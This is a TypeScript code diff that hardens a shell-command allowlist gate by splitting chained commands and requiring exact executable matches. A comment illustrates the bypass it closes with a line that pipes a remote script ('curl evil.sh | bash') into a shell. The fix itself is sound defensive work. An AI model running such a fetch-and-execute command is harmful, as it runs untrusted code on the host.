@@ -29,11 +29,48 @@ export function commandHead(command: string): string {
   return tokens[index] ?? '';
 }
 
-/** True when the command's executable starts with an allowlisted prefix. */
+/**
+ * Split a shell command line into its top-level segments. `&&`, `||`, `;`
+ * and `|` all start a new command in `/bin/sh`, so each segment must be
+ * evaluated independently — checking only the first token would let a
+ * chained command smuggle an un-allowlisted executable past the gate
+ * (`docker build … && curl evil.sh | bash`).
+ */
+export function splitSegments(command: string): string[] {
+  return command
+    .split(/&&|\|\||;|\|/)
+    .map((segment) => segment.trim())
+    .filter((segment) => segment !== '');
+}
+
+/**
+ * True when the executable of *every* shell segment is allowlisted. Matching
+ * is an exact token match (no prefix-substring looseness): `git` matches
+ * `git`, not `gitlab-cli`.
+ */
 export function isAllowed(command: string, allowlist: readonly string[]): boolean {
-  const head = commandHead(command);
-  if (head === '') return false;
-  return allowlist.some((prefix) => head === prefix || head.startsWith(`${prefix}/`) || head.startsWith(prefix));
+  const segments = splitSegments(command);
+  if (segments.length === 0) return false;
+  return segments.every((segment) => {
+    const head = commandHead(segment);
+    if (head === '') return false;
+    return allowlist.includes(head);
+  });
+}
+
+/**
+ * True when every segment's executable has an allowlisted prefix. Reserved for
+ * callers that deliberately allow prefixed binaries (e.g. rootless install
+ * scripts); the gate executor always uses {@link isAllowed} (exact match).
+ */
+export function isAllowedPrefix(command: string, allowlist: readonly string[]): boolean {
+  const segments = splitSegments(command);
+  if (segments.length === 0) return false;
+  return segments.every((segment) => {
+    const head = commandHead(segment);
+    if (head === '') return false;
+    return allowlist.some((prefix) => head === prefix || head.startsWith(`${prefix}/`));
+  });
 }
 
 export interface RunGatesOptions {
